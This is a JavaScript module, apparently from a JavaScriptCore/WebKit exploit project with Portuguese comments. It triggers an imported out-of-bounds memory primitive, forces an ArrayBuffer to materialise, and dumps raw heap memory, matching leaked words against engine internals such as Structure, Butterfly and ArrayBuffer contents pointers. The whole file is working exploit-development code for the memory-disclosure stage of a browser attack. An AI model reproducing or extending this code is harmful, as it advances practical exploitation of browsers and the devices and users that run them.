// js/script3/testFullABMaterializationAndDump.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute, 
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeFullABMaterializationAndDumpTest() {
    const FNAME_TEST = "executeFullABMaterializationAndDumpTest";
    logS3(`--- Iniciando Teste: Materialização Completa do ArrayBuffer e Dump da Estrutura ---`, "test", FNAME_TEST);
    document.title = `Full AB Materialization & Dump`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }
    logS3(`oob_array_buffer_real configurado. Tamanho total via JS: ${oob_array_buffer_real.byteLength} bytes.`, "info", FNAME_TEST);
    
    // 1. Forçar Materialização Completa do oob_array_buffer_real com Operações Mais Envolvidas
    logS3("--- 1. Forçando Materialização Completa do oob_array_buffer_real ---", "subtest", FNAME_TEST);
    try {
        if (oob_array_buffer_real.byteLength > 0) {
            logS3("   Criando Uint8Array sobre oob_array_buffer_real...", "info", FNAME_TEST);
            const u8_view = new Uint8Array(oob_array_buffer_real);
            
            const fillLength = Math.min(1024, u8_view.length);
            logS3(`   Preenchendo ${fillLength} bytes com u8_view.fill(0xAA)...`, "info", FNAME_TEST);
            u8_view.fill(0xAA, 0, fillLength);
            
            logS3(`   Lendo alguns bytes: u8_view[0]=${toHex(u8_view[0], 8)}, u8_view[${Math.min(10, fillLength-1)}]=${toHex(u8_view[Math.min(10, fillLength-1)], 8)}`, "info", FNAME_TEST);
            
            logS3("   Criando DataView sobre oob_array_buffer_real e escrevendo Uint32...", "info", FNAME_TEST);
            const dv_check = new DataView(oob_array_buffer_real);
            if (dv_check.byteLength >= 20) { // Garantir que há espaço
                dv_check.setUint32(16, 0x12345678, true);
                logS3(`   DataView: Lido de volta de offset 16: ${toHex(dv_check.getUint32(16, true))}`, "info", FNAME_TEST);
            } else {
                logS3("   DataView: Buffer muito pequeno para escrita no offset 16.", "warn", FNAME_TEST);
            }
            
            logS3("   Chamando oob_array_buffer_real.slice(0, 16)...", "info", FNAME_TEST);
            const sliced_ab = oob_array_buffer_real.slice(0, Math.min(16, oob_array_buffer_real.byteLength));
            logS3(`   Slice realizado. Tamanho do slice: ${sliced_ab.byteLength}`, "info", FNAME_TEST);

            logS3("   Operações de materialização concluídas.", "good", FNAME_TEST);
        } else {
            logS3("   oob_array_buffer_real tem tamanho 0, pulando operações de materialização.", "warn", FNAME_TEST);
        }
    } catch (e_materialization) {
        logS3(`   ERRO durante as operações de materialização: ${e_materialization.message}`, "error", FNAME_TEST);
        console.error("Erro Materialização AB:", e_materialization);
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa maior após operações

    // 2. Dump dos primeiros 64 bytes do oob_array_buffer_real
    const bytesToDump = Math.min(64, oob_array_buffer_real.byteLength);
    logS3(`--- 2. Dump dos Primeiros ${bytesToDump} Bytes do oob_array_buffer_real (após materialização) ---`, "subtest", FNAME_TEST);
    
    let expected_offsets_info = "Offsets esperados (de config.mjs):\n";
    try {
        expected_offsets_info += `  - JSCell.STRUCTURE_ID_OFFSET: ${toHex(parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16))} (Uint32)\n`;
        expected_offsets_info += `  - JSCell.FLAGS_OFFSET: ${toHex(parseInt(JSC_OFFSETS.JSCell.FLAGS_OFFSET, 16))} (Uint32)\n`;
        expected_offsets_info += `  - JSCell.STRUCTURE_POINTER_OFFSET: ${toHex(parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16))} (QWORD*)\n`;
        expected_offsets_info += `  - JSObject.BUTTERFLY_OFFSET: ${toHex(parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16))} (QWORD*)\n`;
        expected_offsets_info += `  - ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET: ${toHex(parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16))} (QWORD*)\n`;
        expected_offsets_info += `  - ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: ${toHex(parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16))} (QWORD ou Uint32)`;
        logS3(expected_offsets_info, "info", FNAME_TEST);
    } catch (e) {
        logS3("Erro ao parsear offsets do config.mjs para logging.", "warn", FNAME_TEST);
    }

    for (let current_offset = 0; current_offset < bytesToDump; current_offset += 8) {
        if (current_offset + 8 > oob_array_buffer_real.byteLength) {
            // Lidar com bytes restantes se não formarem um QWORD completo
            let remainingBytesStr = "";
            for (let rem_offset = current_offset; rem_offset < oob_array_buffer_real.byteLength; rem_offset++) {
                try { remainingBytesStr += toHex(oob_read_absolute(rem_offset, 1), 8) + " "; } catch (e_rem) { remainingBytesStr += "ERR "; }
            }
            if (remainingBytesStr) { logS3(`   Offset ${toHex(current_offset)} - ${toHex(oob_array_buffer_real.byteLength -1)} (bytes restantes): ${remainingBytesStr.trim()}`, "leak", FNAME_TEST); }
            break;
        }
        try {
            const val = oob_read_absolute(current_offset, 8);
            let interpretation = "";
            if (current_offset === parseInt(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 16)) {
                interpretation = " (Esperado: Structure*)";
            } else if (current_offset === parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16)) {
                interpretation = " (Esperado: ContentsImpl* / m_impl)";
            } else if (current_offset === parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16)) {
                interpretation = " (Esperado: Tamanho JSArrayBuffer)";
            } else if (current_offset === parseInt(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 16)) {
                interpretation = " (Esperado: Butterfly*)";
            } else if (current_offset === 0x00 ) { // Para JSCell.STRUCTURE_ID_OFFSET e JSCell.FLAGS_OFFSET
                const structIDOffset = parseInt(JSC_OFFSETS.JSCell.STRUCTURE_ID_OFFSET, 16);
                const flagsOffset = parseInt(JSC_OFFSETS.JSCell.FLAGS_OFFSET, 16);
                if (structIDOffset === 0x00 && flagsOffset === 0x04) {
                     interpretation = ` (Esperado: ID=${toHex(val.low())} Flags=${toHex(val.high())} - se QWORD lido como U32_low, U32_high)`;
                } else {
                     interpretation = ` (Esperado: Início JSCell)`;
                }
            }

            if (isAdvancedInt64Object(val)) {
                logS3(`   Offset ${toHex(current_offset)} - ${toHex(current_offset + 7)}: ${val.toString(true)} (L: ${toHex(val.low())} H: ${toHex(val.high())})${interpretation}`, "leak", FNAME_TEST);
            } else {
                logS3(`   Offset ${toHex(current_offset)}: Leitura de 8 bytes não retornou AdvancedInt64.`, "warn", FNAME_TEST);
            }
        } catch (e) {
            logS3(`   Erro ao ler 8 bytes do offset ${toHex(current_offset)}: ${e.message}`, "error", FNAME_TEST);
        }
        if (current_offset < bytesToDump - 8) { 
             await PAUSE_S3(5); 
        }
    }

    logS3(`--- Teste Materialização Completa e Dump CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `Full AB Mat. & Dump Done`;
    clearOOBEnvironment();
}
